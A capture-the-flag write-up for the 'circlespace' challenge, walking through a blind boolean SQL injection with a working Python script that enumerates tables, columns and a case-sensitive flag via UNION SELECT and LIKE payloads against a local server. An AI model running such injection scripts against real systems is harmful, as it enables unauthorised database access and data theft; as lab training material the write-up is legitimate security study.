# circlespace

The SQL injection is pretty blind with this one, as you're not really given any indication that
the SQL query failed. Failed results will just return `is not part of the circle`, as well as
no results. 

What you can do however, is leverage the true or false returned from the server (is part, is not part)
in order to bruteforce the names of the tables + eventually the flag that we want. Hopefully the
servers don't get hammered too much by this brute-force challenge :P

```py3
#!/usr/bin/python3
import requests
import string

CHARSET = list(string.ascii_lowercase + string.digits) + ['\\_', '-', '{', '}']
CHARSET_CASE_SENSITIVE = list(string.ascii_lowercase + string.ascii_uppercase + string.digits) + ['\\_', '-', '{', '}']

BASE_URL = "http://localhost:5000"

def query(url: str, sql: str, result: list, charset=CHARSET, current=""):
    found = False
    for i in charset:
        r = s.get(url, params={"name": sql.format(current + i + "%")})
        if "is not part" not in r.text:
            found = True
            res = query(url, sql, result, charset=charset, current=current + i)
            if not res:
                result.append(current + i)
    return found
      

s = requests.Session()
# create a circle
r = s.post(f"{BASE_URL}/create", data={"name": "lol"})
circle_url = r.url

# find the right table

def get_tables():
    q = '" AND 1=0 UNION SELECT 1 FROM information_schema.tables WHERE table_type="BASE TABLE" AND table_schema="circlespace" AND table_name LIKE "{}" -- a'
    tables = []
    query(f"{circle_url}/people", q, tables)
    return tables

print(get_tables())
```

So firstly, we try to enumerate the table names through the LIKE keyword. We then see that there is a
suspicious table called `the_cfg`, so let's explore this further! (I may have assumed that the `table_schema`
is circlespace above), but this only allows the attack to run a little faster as it would not try to
enumerate every table from the DB instance.

```py3
def get_columns():
    q = '" AND 1=0 UNION SELECT 1 FROM information_schema.columns WHERE table_schema="circlespace" AND table_name="the_cfg" AND column_name LIKE "{}" -- a'
    columns = []
    query(f"{circle_url}/people", q, columns)
    return columns

print(get_columns())
```

We are able to see that the table has two columns, `cfg_key` and `cfg_value`. This means that we
should be onto something. I kinda cheated a little bit below as I didn't look at the `cfg_key`
column.

Also should mention that the flag is case-sensitive, which is why I used LIKE BINARY instead of
just LIKE.

```py3
def get_flag():
    q = '" AND 1=0 UNION SELECT 1 FROM the_cfg WHERE cfg_value LIKE BINARY "{}" -- a'
    flags = []
    query(f"{circle_url}/people", q, flags, charset=CHARSET_CASE_SENSITIVE)
    return flags

print(get_flag())
```

Only a total of 3400 requests to the server to get the flag, that's probably the shortest I can get it
to without compromising the difficulty...
